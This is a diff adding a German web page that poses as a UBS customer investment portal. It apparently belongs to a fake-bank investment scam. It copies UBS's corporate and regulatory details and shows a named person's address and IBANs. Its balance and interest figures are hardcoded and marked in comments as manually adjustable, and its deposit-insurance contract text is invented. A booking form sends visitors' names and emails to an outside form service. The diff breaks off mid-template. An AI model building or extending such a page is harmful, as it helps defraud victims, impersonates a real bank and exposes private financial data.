@@ -1,0 +1,1096 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Kundenzugang</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --red: #f10a0a;
+      --gray-bg: #f5f5f5;
+      --card-bg: #fff;
+      --text: #111;
+      --green: #f10a0a;
+    }
+    .footer {
+  background-color: #f7f6f2;
+  padding: 30px 20px;
+  font-size: 14px;
+  color: #333;
+  text-align: left;
+  border-top: 1px solid #ccc;
+}
+
+.footer-content {
+  max-width: 1000px;
+  margin: 0 auto;
+}
+
+.footer a {
+  color: #333;
+  text-decoration: none;
+  margin: 0 4px;
+}
+
+.footer a:hover {
+  text-decoration: underline;
+}
+
+.footer p {
+  margin: 10px 0;
+  line-height: 1.6;
+}
+
+        .container {
+      display: flex;
+      gap: 30px;
+      flex-wrap: wrap;
+    }
+    .card {
+      background: #f7f6f2;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+      padding: 24px;
+      flex: 1 1 300px;
+      max-width: 400px;
+    }
+    .card h2 {
+      font-size: 20px;
+      font-weight: bold;
+      margin: 0 0 10px;
+    }
+    .amount {
+      font-size: 18px;
+      font-weight: bold;
+      color: #2e7d32;
+    }
+    .rate {
+      margin-top: 10px;
+      font-size: 15px;
+      color: #333;
+    }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--gray-bg);
+      color: var(--text);
+      line-height: 1.6;
+    }
+    .logout-button {
+      background: var(--red);
+      color: #fff;
+      font-weight: 600;
+      font-size: 1rem;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      transition: background 0.2s ease-in-out, transform 0.2s;
+    }
+    .logout-button:hover {
+      background: #f10a0a;
+      transform: translateY(-2px);
+    }
+    .app-header {
+      background: #fff;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 2rem;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+      z-index: 99;
+    }
+    .app-header img {
+      height: 45px;
+    }
+    #sidebar-menu {
+      width: 220px;
+      background: #fff;
+      position: fixed;
+      top: 60px;
+      left: 0;
+      height: calc(100vh - 60px);
+      box-shadow: 2px 0 8px rgba(0,0,0,0.05);
+      z-index: 98;
+      padding-top: 20px;
+    }
+    #sidebar-menu .grid-item {
+      padding: 14px;
+      text-align: center;
+      border-bottom: 1px solid #eee;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    #sidebar-menu .grid-item:hover {
+      background: #f1f1f1;
+    }
+    #sidebar-menu i {
+      font-size: 20px;
+      color: var(--red);
+    }
+    #sidebar-menu span {
+      display: block;
+      font-size: 0.9rem;
+      margin-top: 5px;
+    }
+    .app-container {
+      margin-left: 220px;
+      padding: 100px 40px 80px;
+    }
+    .section-content {
+      background: white;
+      padding: 24px;
+      border-radius: 4px;
+      margin-bottom: 30px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.05);
+      width: 100%;
+    }
+    .progress-container {
+      margin-top: 20px;
+    }
+    .progress-info {
+      margin-bottom: 8px;
+    }
+    .progress-bar-wrapper {
+      position: relative;
+      background: #eee;
+      border-radius: 20px;
+      overflow: hidden;
+      height: 20px;
+    }
+    .progress-bar {
+      height: 100%;
+      background: var(--green);
+      width: 0%;
+      transition: width 0.6s ease;
+    }
+    .progress-label {
+      position: absolute;
+      right: 10px;
+      top: -28px;
+      font-size: 0.9rem;
+      color: var(--green);
+      font-weight: bold;
+    }
+    .footer-nav {
+      display: none;
+    }
+    @media (max-width: 768px) {
+      .app-container {
+        margin-left: 0;
+        padding: 100px 20px 80px;
+      }
+      #sidebar-menu {
+        display: none;
+      }
+      .footer-nav {
+        display: flex;
+        justify-content: space-around;
+        align-items: center;
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        background: #fff;
+        box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+        padding: 8px 0;
+        z-index: 100;
+      }
+      .footer-item {
+        flex: 1;
+        text-align: center;
+        font-size: 0.8rem;
+        color: var(--text);
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+      .footer-item i {
+        font-size: 20px;
+        color: var(--red);
+        display: block;
+        margin-bottom: 4px;
+      }
+      .footer-item span {
+        font-size: 0.7rem;
+      }
+      .footer-item.active {
+        transform: translateY(-6px);
+        color: var(--red);
+        font-weight: bold;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div id="main-dashboard" style="display: none;">
+    <div class="app-header">
+      <img src="https://github.com/securedigitalkonto/kundename/blob/main/logo1.png?raw=true" alt="Logo">
+      <button class="logout-button" onclick="logout()">Abmelden</button>
+    </div>
+
+    <div id="sidebar-menu">
+      <div class="grid-item" onclick="showSection('anlagekonto')"><i class="fas fa-piggy-bank"></i><span>Anlagekonto</span></div>
+      <div class="grid-item" onclick="showSection('kontoinhaber')"><i class="fas fa-user"></i><span>Referenzkonto</span></div>
+      <div class="grid-item" onclick="showSection('paket')"><i class="fas fa-box"></i><span>Anlagepaket</span></div>
+      <div class="grid-item" onclick="showSection('transaktionen')"><i class="fas fa-history"></i><span>Transaktionen</span></div>
+      <div class="grid-item" onclick="showSection('referenzkonto')"><i class="fas fa-university"></i><span>Abwicklungskonto</span></div>
+      <div class="grid-item" onclick="showSection('support')"><i class="fas fa-headset"></i><span>Support</span></div>
+    </div>
+
+    <div class="app-container">
+      <div class="section-content" id="section-anlagekonto">
+<!-- Dashboard-Inhalt -->
+<div style="margin: 0; padding: 40px 20px; font-family: Arial, sans-serif; background-color: #fff;">
+
+  <!-- Kopfbereich -->
+  <div style="background: #f9f9f9; padding: 16px 20px; border-radius: 12px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
+    <div style="display: flex; align-items: center; gap: 10px;">
+      <i class="fa-solid fa-user" style="color: red; font-size: 22px;"></i>
+      <h2 style="margin: 0; font-size: 20px;"><strong>Hans Tyrach</strong></h2>
+    </div>
+    <div style="text-align: right; font-size: 14px;">
+      <strong>Anlagesumme:</strong><br>
+      <span id="kontostand" style="color: green; font-size: 16px; font-weight: bold;">EUR 0,00</span>
+    </div>
+  </div>
+
+  <!-- Persönliche Daten -->
+  <div style="background: #f9f9f9; padding: 20px; border-radius: 12px; margin-bottom: 30px; display: flex; flex-direction: column; gap: 20px;">
+    <h2 style="font-size: 20px; display: flex; align-items: center; gap: 10px;">
+      <i class="fa-solid fa-id-card" style="color: red;"></i>
+      <strong>Persönliche Daten</strong>
+    </h2>
+
+    <div style="display: flex; flex-wrap: wrap; gap: 20px;">
+      <!-- Anschrift -->
+      <div style="flex: 1 1 48%; background: #fff; padding: 16px 20px; border-radius: 10px;">
+        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px;">
+          <i class="fa-solid fa-house" style="color: red;"></i>
+          <strong style="font-size: 16px;">Anschrift</strong>
+        </div>
+        <p><strong>Straße:</strong> Kirchhainer Damm 94c</p>
+        <p><strong>PLZ:</strong> 12309</p>
+        <p><strong>Ort:</strong> Berlin</p>
+        <p><strong>Land:</strong> Deutschland</p>
+      </div>
+
+      <!-- Kontoverbindung -->
+      <div style="flex: 1 1 48%; background: #fff; padding: 16px 20px; border-radius: 10px;">
+        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px;">
+          <i class="fa-solid fa-building-columns" style="color: red;"></i>
+          <strong style="font-size: 16px;">Kontoverbindung</strong>
+        </div>
+        <p><strong>Festgeldkonto:</strong> UBS FLEX</p>
+        <p><strong>IBAN:</strong> CH720026626613336740A</p>
+        <p><strong>Kontonummer:</strong> 26613336740A</p>
+        <p><strong>BLZ:</strong> 26613336740A</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Anlagepaket -->
+  <div style="background: #f9f9f9; padding: 20px; border-radius: 12px; display: flex; flex-direction: column; gap: 20px;">
+    <h2 style="font-size: 20px; display: flex; align-items: center; gap: 10px;">
+      <i class="fa-solid fa-box" style="color: red;"></i>
+      <strong>Aktives Anlagepaket</strong>
+    </h2>
+
+    <div style="display: flex; flex-wrap: wrap; gap: 20px; justify-content: space-between;">
+      <!-- Paketdetails -->
+      <div style="flex: 1 1 45%; background: #fff; padding: 16px 20px; border-radius: 10px;">
+        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px;">
+          <i class="fa-solid fa-file-contract" style="color: red;"></i>
+          <strong style="font-size: 16px;">Paketdetails</strong>
+        </div>
+        <p><strong>Paket:</strong> Tagesgeld UBS Flex</p>
+        <p><strong>Anlagebetrag:</strong> EUR 25.000,00</p>
+        <p><strong>Laufzeit:</strong> 12 Monate</p> <!-- ✅ manuell anpassbar -->
+        <p><strong>Zinssatz:</strong> 2,95 % p.a.</p> <!-- ✅ manuell anpassbar -->
+        <p><strong>Zinsberechnung ab:</strong> 29.07.2025</p> <!-- ✅ manuell anpassbar -->
+      </div>
+
+      <!-- Zinsübersicht -->
+      <div style="flex: 1 1 45%; background: #fff; padding: 16px 20px; border-radius: 10px;">
+        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px;">
+          <i class="fa-solid fa-euro-sign" style="color: red;"></i>
+          <strong style="font-size: 16px;">Zinsübersicht</strong>
+        </div>
+        <p><strong>Voraussichtliche Zinsgutschrift:</strong> <span id="zins-gesamt">0</span> €</p>
+        <p><strong>Monatlicher Zinsertrag:</strong> <span id="zins-monatlich">0</span> €</p>
+        <p><strong>Zinsgutschrift bisher:</strong> <span id="zins-bisher">0</span> €</p>
+        <p><strong>Zins verbleibend:</strong> <span id="zins-verbleibend">0</span> €</p>
+      </div>
+    </div>
+
+    <!-- Fortschrittsbalken -->
+    <div style="width: 100%; margin-top: 10px;">
+      <p style="margin-bottom: 6px;"><strong><span id="progress-prozent">0</span>% erreicht</strong> – <span id="zins-eingegangen">0,00 €</span> Zinsen erhalten</p>
+      <div style="width: 100%; height: 16px; background: #eee; border-radius: 10px; overflow: hidden;">
+        <div id="progress-bar" style="width: 0%; height: 100%; background-color: #28a745;"></div>
+      </div>
+      <p style="margin-top: 6px; text-align: right;"><small><span id="tage-verbleibend">...</span> Tage verbleibend</small></p>
+    </div>
+  </div>
+</div>
+
+<!-- Berechnungsskript -->
+<script>
+  // ✅ Einstellbare Variablen
+  const anlagebetrag = 25000;
+  const zinssatz = 0.0295;
+  const laufzeitInMonaten = 12;
+  const startdatum = new Date("2025-07-30"); <!-- ✅ manuell anpassbar -->
+  const anlage_aktiv = true; // ← Nur wenn true und Datum erreicht → wird Anlage aktiv
+
+  const heute = new Date();
+  const laufzeitTage = laufzeitInMonaten * 30.42;
+  const zinsGesamt = ((anlagebetrag * zinssatz) / 365) * laufzeitTage;
+  const zinsMonatlich = zinsGesamt / laufzeitInMonaten;
+
+  let tageVergangen = 0;
+  let zinsAktuell = 0;
+  let kontostand = 0;
+
+  if (anlage_aktiv && heute >= startdatum) {
+    tageVergangen = Math.floor((heute - startdatum) / (1000 * 60 * 60 * 24));
+    zinsAktuell = ((anlagebetrag * zinssatz) / 365) * tageVergangen;
+    kontostand = anlagebetrag + zinsAktuell;
+  }
+
+  const progress = Math.min(100, (zinsAktuell / zinsGesamt) * 100);
+  const tageVerbleibend = Math.max(0, Math.round(laufzeitTage - tageVergangen));
+
+  // HTML aktualisieren
+  document.getElementById("kontostand").textContent = `EUR ${kontostand.toLocaleString("de-DE", { minimumFractionDigits: 2 })}`;
+  document.getElementById("zins-gesamt").textContent = zinsGesamt.toFixed(2);
+  document.getElementById("zins-monatlich").textContent = zinsMonatlich.toFixed(2);
+  document.getElementById("zins-bisher").textContent = zinsAktuell.toFixed(2);
+  document.getElementById("zins-verbleibend").textContent = (zinsGesamt - zinsAktuell).toFixed(2);
+  document.getElementById("zins-eingegangen").textContent = `${zinsAktuell.toFixed(2)} €`;
+  document.getElementById("progress-bar").style.width = `${progress}%`;
+  document.getElementById("progress-prozent").textContent = Math.floor(progress);
+  document.getElementById("tage-verbleibend").textContent = tageVerbleibend;
+</script>
+<!-- kontoihbaer -->
+      </div>
+      <div class="section-content" id="section-kontoinhaber" style="display:none;">
+<style>
+  .konto-container {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 30px;
+    margin-top: 10px;
+  }
+
+  .konto-block {
+    flex: 1 1 45%;
+    min-width: 300px;
+    padding: 10px;
+    border-left: 4px solid red;
+    background-color: #f9f9f9;
+    border-radius: 6px;
+  }
+
+  .konto-block i {
+    color: red;
+    margin-right: 6px;
+  }
+
+  .konto-block strong {
+    display: inline-block;
+    margin-bottom: 4px;
+  }
+</style>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<style>
+  .referenz-container {
+    background-color: #f5f5f5;
+    padding: 20px;
+    font-family: sans-serif;
+    font-size: 16px;
+    border-radius: 10px;
+  }
+
+  .referenz-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 20px;
+  }
+
+  .referenz-box {
+    background-color: white;
+    padding: 20px;
+    border-radius: 16px;
+    flex: 1;
+    min-width: 300px;
+  }
+
+  .referenz-title {
+    font-size: 1.3em;
+    margin-bottom: 15px;
+    display: flex;
+    align-items: center;
+    font-weight: bold;
+  }
+
+  .referenz-title i {
+    color: red;
+    margin-right: 10px;
+  }
+
+  .referenz-box p {
+    margin: 5px 0;
+  }
+
+  .referenz-box strong {
+    font-weight: 700;
+  }
+
+  .hinweise {
+    margin-top: 25px;
+    font-size: 15px;
+    line-height: 1.5;
+  }
+</style>
+
+<!-- Referenzkonto -->
+<div style="background-color: #f9f9f9; padding: 16px 20px; border-radius: 12px; margin-bottom: 30px; font-family: Arial, sans-serif; font-size: 16px;">
+
+  <!-- Titel -->
+  <div style="background-color: #fff; padding: 16px 20px; border-radius: 10px; margin-bottom: 20px;">
+    <h2 style="font-size: 20px; display: flex; align-items: center; gap: 10px; margin: 0;">
+      <i class="fa-solid fa-money-check-dollar" style="color: red;"></i>
+      <strong>Referenzkonto</strong>
+    </h2>
+  </div>
+
+  <!-- Inhalt in zwei Spalten -->
+  <div style="display: flex; flex-wrap: wrap; gap: 20px; margin-bottom: 20px;">
+    
+    <!-- Zahlungsinformationen -->
+    <div style="flex: 1 1 48%; background-color: #fff; padding: 16px 20px; border-radius: 10px;">
+      <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px;">
+        <i class="fa-solid fa-credit-card" style="color: red;"></i>
+        <strong style="font-size: 16px;">Zahlungsinformationen</strong>
+      </div>
+      <p><strong>Empfänger:</strong> <span id="empfaenger">Hans Tyrach</span></p>
+      <p><strong>IBAN:</strong> <span id="iban">DE62100100100326344102</span></p>
+      <p><strong>BIC (SWIFT):</strong> <span id="bic">PBNKDEFFXXX</span></p>
+      <p><strong>BLZ:</strong> <span id="blz">10010010</span></p>
+      <p><strong>Bank:</strong> <span id="bank">Postbank Ndl der Deutsche Bank</span></p>
+      <p><strong>Ort:</strong> <span id="city">Berlin</span></p>
+      <p><strong>Verwendungszweck:</strong> UBS Anlage Rückführung</p>
+    </div>
+
+    <!-- Formular -->
+    <div style="flex: 1 1 48%; background-color: #fff; padding: 16px 20px; border-radius: 10px;">
+      <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px;">
+        <i class="fa-solid fa-pen-to-square" style="color: red;"></i>
+        <strong style="font-size: 16px;">Referenzkonto ändern</strong>
+      </div>
+      <label><strong>Empfänger:</strong></label><br>
+      <input id="inp-empfaenger" type="text" placeholder="z.B. Max Mustermann" style="width: 100%; margin-bottom: 10px; padding: 8px; border-radius: 6px; border: 1px solid #ccc;"><br>
+
+      <label><strong>IBAN:</strong></label><br>
+      <input id="inp-iban" type="text" placeholder="z.B. DE..." style="width: 100%; margin-bottom: 10px; padding: 8px; border-radius: 6px; border: 1px solid #ccc;"><br>
+
+      <button onclick="updateReferenzkonto()" style="background-color: red; color: white; padding: 8px 16px; border: none; border-radius: 6px; cursor: pointer;">
+        Speichern
+      </button>
+      <p id="iban-feedback" style="margin-top: 10px; font-size: 14px; color: red;"></p>
+    </div>
+  </div>
+
+  <!-- Hinweisbox -->
+  <div style="background-color: #fff; padding: 16px 20px; border-radius: 10px; font-size: 15px; line-height: 1.5;">
+    <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 10px;">
+      <i class="fa-solid fa-circle-info" style="color: red;"></i>
+      <strong>Wichtige Hinweise zum Referenzkonto:</strong>
+    </div>
+    <ul style="padding-left: 20px; margin-top: 10px;">
+      <li>Die Auszahlung Ihrer Anlagebeträge erfolgt ausschließlich auf das von Ihnen hinterlegte persönliche Referenzkonto.</li>
+      <li>Dieses Konto muss auf Ihren Namen lauten und vollständig im System hinterlegt und verifiziert sein.</li>
+      <li>Auszahlungen an Konten Dritter oder nicht verifizierte Bankverbindungen sind nicht zulässig – weder aus rechtlichen noch aus sicherheitsrelevanten Gründen.</li>
+      <li>Änderungen am Referenzkonto können nur schriftlich und nach erfolgreicher Identitätsprüfung über unseren Kundendienst vorgenommen werden.</li>
+      <li>Die Bankverbindung wird gemäß den Anforderungen des Geldwäschegesetzes (GwG) und der EU-Richtlinien zur Verhinderung von Geldwäsche und Terrorismusfinanzierung geprüft und gespeichert.</li>
+    </ul>
+  </div>
+</div>
+
+<script>
+function ladeReferenzkonto() {
+  const gespeicherteDaten = JSON.parse(localStorage.getItem("referenzkonto"));
+  if (!gespeicherteDaten) return;
+
+  document.getElementById('empfaenger').textContent = gespeicherteDaten.empfaenger || '-';
+  document.getElementById('iban').textContent = gespeicherteDaten.iban || '-';
+  document.getElementById('bic').textContent = gespeicherteDaten.bic || '-';
+  document.getElementById('blz').textContent = gespeicherteDaten.blz || '-';
+  document.getElementById('bank').textContent = gespeicherteDaten.bank || '-';
+  document.getElementById('city').textContent = gespeicherteDaten.city || '-';
+}
+
+async function updateReferenzkonto() {
+  const emp = document.getElementById('inp-empfaenger').value.trim();
+  const ibanVal = document.getElementById('inp-iban').value.trim().replace(/\s+/g, '');
+  const fb = document.getElementById('iban-feedback');
+  fb.style.display = 'block';
+  fb.style.color = 'black';
+  fb.textContent = 'Prüfung läuft…';
+
+  if (!ibanVal) {
+    fb.textContent = 'Bitte IBAN eingeben.';
+    fb.style.color = 'red';
+    return;
+  }
+
+  try {
+    const res = await fetch(`https://openiban.com/validate/${ibanVal}?getBIC=true&validateBankCode=true`);
+    const data = await res.json();
+
+    if (!data || !data.valid) {
+      fb.textContent = 'IBAN ungültig oder nicht geprüft.';
+      fb.style.color = 'red';
+      return;
+    }
+
+    if (!data.bankData) {
+      fb.textContent = 'Bankinformationen konnten nicht ermittelt werden.';
+      fb.style.color = 'orange';
+      return;
+    }
+
+    const referenz = {
+      empfaenger: emp || '-',
+      iban: data.iban || '-',
+      bic: data.bankData.bic || '-',
+      blz: data.bankData.bankCode || '-',
+      bank: data.bankData.name || '-',
+      city: data.bankData.city || '-'
+    };
+
+    // UI aktualisieren
+    document.getElementById('empfaenger').textContent = referenz.empfaenger;
+    document.getElementById('iban').textContent = referenz.iban;
+    document.getElementById('bic').textContent = referenz.bic;
+    document.getElementById('blz').textContent = referenz.blz;
+    document.getElementById('bank').textContent = referenz.bank;
+    document.getElementById('city').textContent = referenz.city;
+
+    // Lokale Speicherung
+    localStorage.setItem("referenzkonto", JSON.stringify(referenz));
+
+    fb.textContent = 'IBAN erfolgreich geprüft und gespeichert.';
+    fb.style.color = 'green';
+
+  } catch (err) {
+    console.error(err);
+    fb.textContent = 'Fehler bei der Prüfung. Bitte später erneut versuchen.';
+    fb.style.color = 'red';
+  }
+}
+
+// Beim Laden automatisch prüfen
+document.addEventListener("DOMContentLoaded", ladeReferenzkonto);
+</script>
+
+
+  <br>
+      </div>
+      <div class="section-content" id="section-paket" style="display:none;">
+
+<!-- Anlagepakete Grid -->
+<div style="background: #fff; padding: 30px; border-radius: 12px; margin-top: 30px; font-family: Arial, sans-serif;">
+  <h2 style="display: flex; align-items: center; gap: 10px; font-size: 20px;">
+    <i class="fa-solid fa-box" style="color: red;"></i>
+    <strong>Alle Anlagepakete</strong>
+  </h2>
+  <div class="paket-grid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; margin-top: 20px;"></div>
+</div>
+
+<!-- Vertragsformular als Modal -->
+<div id="vertragsFormular" style="display:none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.6); z-index: 9999; justify-content: center; align-items: center;">
+  <div style="background: #fff; padding: 40px; border-radius: 8px; width: 100%; max-width: 860px; max-height: 90vh; overflow-y: auto; font-family: Arial, sans-serif; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.2);">
+    <button onclick="document.getElementById('vertragsFormular').style.display='none'" style="position: absolute; top: 10px; right: 20px; background: transparent; border: none; font-size: 24px; cursor: pointer;">&times;</button>
+
+    <!-- Logo + Header -->
+    <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 20px;">
+      <div style="display: flex; align-items: center; gap: 15px;">
+        <img src="https://github.com/securedigitalkonto/kundename/blob/main/logo1.png?raw=true" alt="UBS Logo" style="height: 40px;">
+        <div style="font-size: 14px;">
+          <strong>UBS Switzerland AG</strong><br>
+          Bahnhofstrasse 45 – Postfach 8001 Zürich, Schweiz<br>
+          Handelsregisternr.: CH-020.3.041.020-3<br>
+          MwSt.-Nr.: CHE-412.669.376 MWST<br>
+          Reguliert durch die FINMA
+        </div>
+      </div>
+      <div style="text-align: right; font-size: 14px;">
+        <strong>Anlagevertrag</strong><br>
+        Vertragsnummer: <span style="text-decoration: underline;">[automatisch]</span>
+      </div>
+    </div>
+
+    <!-- Vertragstext -->
+    <div id="vertragstext" style="max-height: 250px; height: 250px; overflow-y: auto; display: block; padding: 15px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; font-size: 13px; background: #f9f9f9;"></div>
+
+    <!-- Paketinfo -->
+    <div id="paketInfoBox" style="border: 1px solid #ccc; background: #f9f9f9; border-radius: 12px; padding: 20px; margin-top: 30px; margin-bottom: 30px; font-size: 15px;">
+      <strong id="infoPaketName" style="font-size: 18px;"></strong><br>
+      <p><strong>Laufzeit:</strong> <span id="infoLaufzeit"></span></p>
+      <p><strong>Zinssatz:</strong> <span id="infoZinssatz"></span></p>
+      <p><strong>Anlagebetrag:</strong> <span id="infoBetrag"></span></p>
+      <p><strong>Zinsertrag:</strong> <span id="infoErtrag"></span></p>
+      <hr>
+      <p style="color: green;"><strong>✔ Einlagensicherung:</strong> bis 100.000 CHF</p>
+      <p style="color: green;"><strong>✔ Keine Wechselkursgebühren</strong></p>
+    </div>
+
+    <!-- Formular -->
+    <h3 style="color: #cc0000;">Persönliche Angaben</h3>
+    <form id="vertragsFormularAbsenden">
+      <input type="hidden" id="formPaket" name="paket">
+      <input type="hidden" id="formLaufzeit" name="laufzeit">
+      <input type="hidden" id="formZinssatz" name="zinssatz">
+      <input type="hidden" id="formBetrag" name="anlagebetrag">
+
+      <div style="display: flex; flex-wrap: wrap; gap: 20px; font-size: 14px;">
+        <input type="text" name="name" placeholder="Vor- und Nachname" required style="flex: 1; border: 2px solid red; padding: 8px; border-radius: 6px;">
+        <input type="email" name="email" placeholder="E-Mail-Adresse" required style="flex: 1; border: 2px solid red; padding: 8px; border-radius: 6px;">
+      </div>
+
+      <div style="margin-top: 20px; font-size: 13px;">
+        <label><input type="checkbox" required> Ich buche dieses Paket mit den genannten Konditionen.</label><br>
+        <label><input type="checkbox" required> Ich habe den Vertragstext gelesen und bin einverstanden.</label>
+      </div>
+
+      <button type="submit" style="background: #cc0000; color: white; padding: 12px 24px; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; margin-top: 20px;">Vertrag absenden</button>
+    </form>
+  </div>
+</div>
+
+<script>
+const pakete = [
+  { name: "UBS Silber", laufzeit: "12 Monate", zinssatz: "3.75 %", betrag: "100.000", ertrag: "3.750,00", typ: "festgeld", gebucht: false }, // ✅ Force always 
+  { name: "UBS Bronze", laufzeit: "6 Monate", zinssatz: "3.95 %", betrag: "50.000", ertrag: "987,50", typ: "festgeld", gebucht: false },
+  { name: "UBS Gold", laufzeit: "24 Monate", zinssatz: "3.55 %", betrag: "50.000", ertrag: "3.550,00", typ: "festgeld", gebucht: false },
+  { name: "UBS Premium", laufzeit: "36 Monate", zinssatz: "4.10 %", betrag: "200.000", ertrag: "24.600,00", typ: "festgeld", gebucht: false },
+  { name: "UBS MaxFlex", laufzeit: "12 Monate", zinssatz: "3.50 %", betrag: "50.000", ertrag: "1.750,00", typ: "festgeld", gebucht: false },
+  { name: "UBS Tagesgeld Plus", laufzeit: "täglich verfügbar", zinssatz: "2.25 %", betrag: "50.000", ertrag: "1.125.00", typ: "tagesgeld", gebucht: false },
+];
+
+// ✅ DO NOT load gebuchtePakete from localStorage
+// ✅ DO NOT overwrite p.gebucht
+
+function ladePakete() {
+  const grid = document.querySelector(".paket-grid");
+  grid.innerHTML = "";
+
+  pakete.forEach((p, i) => {
+    const card = document.createElement("div");
+    card.style = "background: #f9f9f9; border-radius: 10px; padding: 16px; border: 1px solid #ccc;";
+
+    const isBooked = p.gebucht;
+
+    const buttonHTML = isBooked
+      ? `<button disabled style="background: green; color: white; padding: 6px 12px; border-radius: 6px; border: none; font-weight: bold;">✔ Paket gebucht</button>`
+      : `<button onclick="oeffneVertragsformular(${i})" style="background: #cc0000; color: white; padding: 6px 12px; border-radius: 6px; border: none; font-weight: bold; cursor: pointer;">Paket buchen</button>`;
+
+    card.innerHTML = `
+      <p><strong>${p.name}</strong></p>
+      <p><strong>Laufzeit:</strong> ${p.laufzeit}</p>
+      <p><strong>Zinssatz:</strong> ${p.zinssatz}</p>
+      <p><strong>Anlagebetrag:</strong> ${p.betrag} EUR</p>
+      <p><strong>Zinsertrag:</strong> ${p.ertrag} EUR</p>
+      <div style="margin-top: 12px;">${buttonHTML}</div>
+    `;
+
+    grid.appendChild(card);
+  });
+}
+
+window.addEventListener("DOMContentLoaded", ladePakete);
+
+function oeffneVertragsformular(index) {
+  const p = pakete[index];
+  sessionStorage.setItem("aktuellesPaketIndex", index);
+
+  document.getElementById("infoPaketName").textContent = p.name;
+  document.getElementById("infoLaufzeit").textContent = p.laufzeit;
+  document.getElementById("infoZinssatz").textContent = p.zinssatz;
+  document.getElementById("infoBetrag").textContent = p.betrag + " EUR";
+  document.getElementById("infoErtrag").textContent = p.ertrag + " EUR";
+
+  document.getElementById("formPaket").value = p.name;
+  document.getElementById("formLaufzeit").value = p.laufzeit;
+  document.getElementById("formZinssatz").value = p.zinssatz;
+  document.getElementById("formBetrag").value = p.betrag + " EUR";
+
+  const vertrag = `
+    <h3>§ 1 Vertragsgegenstand</h3>
+    <p>(1) Die Bank nimmt vom Anleger eine Anlagesumme in Höhe von <strong>${p.betrag} EUR</strong> entgegen.</p>
+    <p>(2) Die Laufzeit beträgt <strong>${p.laufzeit}</strong>.</p>
+    <p>(3) Der Zinssatz beträgt <strong>${p.zinssatz}</strong> pro Jahr. Die zu erwartende Rendite beläuft sich auf <strong>${p.ertrag} EUR</strong>.</p>
+    <h3>§ 2 Verfügbarkeit</h3>
+    <p>${p.typ === 'tagesgeld' ? 'Das Kapital ist täglich verfügbar.' : 'Das Kapital ist für die Laufzeit gebunden.'}</p>
+    <h3>§ 3 Einlagensicherung</h3>
+    <p>Die Einlage ist bis 100.000 CHF durch das eidgenössische Einlagensicherungssystem geschützt.</p>
+    <h3>§ 4 Datenschutz</h3>
+    <p>Alle Daten werden gemäß DSGVO behandelt und nicht an Dritte weitergegeben.</p>
+    <h3>§ 5 Widerrufsrecht</h3>
+    <p>Sie können diesen Vertrag innerhalb von 14 Tagen ohne Angabe von Gründen widerrufen.</p>`;
+
+  document.getElementById("vertragstext").innerHTML = vertrag;
+  document.getElementById("vertragsFormular").style.display = "flex";
+}
+
+document.getElementById("vertragsFormularAbsenden").addEventListener("submit", async function (e) {
+  e.preventDefault();
+  const form = e.target;
+  const data = {
+    paket: form.paket.value,
+    laufzeit: form.laufzeit.value,
+    zinssatz: form.zinssatz.value,
+    anlagebetrag: form.anlagebetrag.value,
+    name: form.name.value,
+    email: form.email.value
+  };
+
+  // Paketstatus auf "gebucht" setzen
+  const index = parseInt(sessionStorage.getItem("aktuellesPaketIndex"));
+  if (!isNaN(index)) {
+    pakete[index].gebucht = true;
+    localStorage.setItem("gebuchtePakete", JSON.stringify(pakete.map(p => p.gebucht)));
+  }
+
+  localStorage.setItem("anlagepaket", JSON.stringify(data));
+
+  await fetch("https://formcarry.com/s/Jna7Be0vdck", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data)
+  });
+
+  document.getElementById("vertragsFormular").style.display = "none";
+  zeigeDankesModal();
+  ladePakete();
+});
+
+function zeigeDankesModal() {
+  const modal = document.createElement("div");
+  modal.style = "position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.5);z-index:9999;display:flex;align-items:center;justify-content:center;";
+  modal.innerHTML = `
+    <div style="background:white;padding:40px;border-radius:12px;max-width:500px;text-align:center;font-family:Arial,sans-serif;">
+      <div style="font-size:40px;margin-bottom:10px;">✅</div>
+      <h2 style="margin:0 0 10px 0;">Vielen Dank!</h2>
